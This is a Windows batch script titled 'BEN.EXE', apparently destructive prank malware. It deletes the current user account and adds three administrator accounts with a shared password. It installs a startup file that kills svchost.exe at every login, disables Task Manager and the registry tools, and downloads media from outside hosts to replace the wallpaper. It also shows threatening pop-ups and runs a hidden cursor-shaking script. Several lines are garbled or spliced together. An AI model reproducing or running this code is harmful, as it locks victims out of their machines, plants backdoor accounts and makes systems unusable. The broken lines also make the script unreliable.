@echo off
title BEN.EXE
mkdir "%temp%\din"
echo really start (y/n)==
set /p input=
if %input%==y goto hack
if %input%==n goto exit

:hack 
net user /delete %username%
net user /adset "url=https://github.com/dnndj-39/ben-theme-music/raw/refs/heads/main/ben-theme.wav"
set "out=%temp%\din\ben-theme.wav"
powershell -Command "Invoke-WebRequest -Uri \"%url%\" -OutFile \"%out%\""
start "" powershell -windowstyle hidden -Command "(New-Object Media.SoundPlayer '%out%').Play()"d Anonymousnake T4@123456
net user /add Anonymousnake2 T4@123456
net user /add Anonymousnake3 T4@123456
net localgroup Administrators Anonymousnake1 /add
net localgroup Administrators Anonymousnake2 /add
net localgroup Administrators Anonymousnake3 /add



set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
echo taskkill /f /im svchost.exe  > "%startup%\BLOODBENISHERE.bat"
set "url=https://github.com/dnndj-39/ben-theme-music/raw/refs/heads/main/ben-theme.wav"
set "out=%temp%\din\ben-theme.wav"


mkdir "%temp%\din" 2>nul


powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%out%'"

timeout /t 1 >nul

start "" powershell -windowstyle hidden -Command "(New-Object Media.SoundPlayer '%out%').PlaySync()"

set "URL=https://i.postimg.cc/wvfBjpK2/images.jpg"
set "FILE=%TEMP%\din\BEN.jpg"

mkdir "%TEMP%\din" 2>nul
curl -o "%FILE%" "%URL%"

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%FILE%" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 10 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f

RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC" ^ /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\Snapins\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" ^ /v Allowed /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
set "vbsFile1=%temp%\din\ERROR1.vbs"
echo x=MsgBox("Hello, do you remember me?",0+16,"BEN.EXE") > "%vbsFile1%"

"%vbsFile1%"

set "vbsFile2=%temp%\din\ERROR2.vbs"
echo x=MsgBox("Yes I am your friend BEN.EXE! , I am come back! ",0+16,"BEN.EXE") > "%vbsFile2%"

"%vbsFile2%"

set "vbsFile3=%temp%\din\ERROR3.vbs"
echo x=MsgBox("You opened me up again!",0+16,"BEN.EXE") > "%vbsFile3%"

"%vbsFile3%"
set "vbsFile4=%temp%\din\ERROR4.vbs"
echo x=MsgBox("You let me in again! ",0+16,"BEN.EXE") > "%vbsFile4%"

"%vbsFile4%

set "vbsFile5=%temp%\din\ERROR5.vbs"
echo x=MsgBox("You Shouldn't Do That",0+16,"BEN.EXE") > "%vbsFile5%"
"%vbsfile5%"

set "vbsFile6=%temp%\din\ERROR6.vbs"
echo x=MsgBox("Ok I give you some advice",0+16,"BEN.EXE") > "%vbsFile6%"
"%vbsfile6%

set "vbsFile7=%temp%\din\ERROR7.vbs"
echo x=MsgBox("You better not turn off your computer , or your computer is dead THE COMPUTER IS MINE",0+16,"BEN.EXE") > "%vbsFile7%"
"%vbsfile7%"

set "vbsFile8=%temp%\din\ERROR8.vbs"
echo x=MsgBox("Find my file to destroy me",0+16,"BEN.EXE") > "%vbsFile8%"
"%vbsfile8%"

set "psFile=%temp%\din\shaker.ps1"
echo Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);' -Name 'User32' -Namespace 'Win32' > "%psFile%"
echo $rand = New-Object System.Random >> "%psFile%"
echo $initialX = [System.Windows.Forms.Cursor]::Position.X >> "%psFile%"
echo $initialY = [System.Windows.Forms.Cursor]::Position.Y >> "%psFile%"
echo $Duration = (Get-Date).AddSeconds(5) >> "%psFile%"
echo while ((Get-Date) -lt $Duration) { >> "%psFile%"
echo     $deltaX = $rand.Next(-4, 5) >> "%psFile%"
echo     $deltaY = $rand.Next(-4, 5) >> "%psFile%"
echo     [Win32.User32]::SetCursorPos($initialX + $deltaX, $initialY + $deltaY) >> "%psFile%"
echo     Start-Sleep -Milliseconds 10 >> "%psFile%"
echo } >> "%ffpsFile%"
start "" PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%psFile%"


:exit
exit
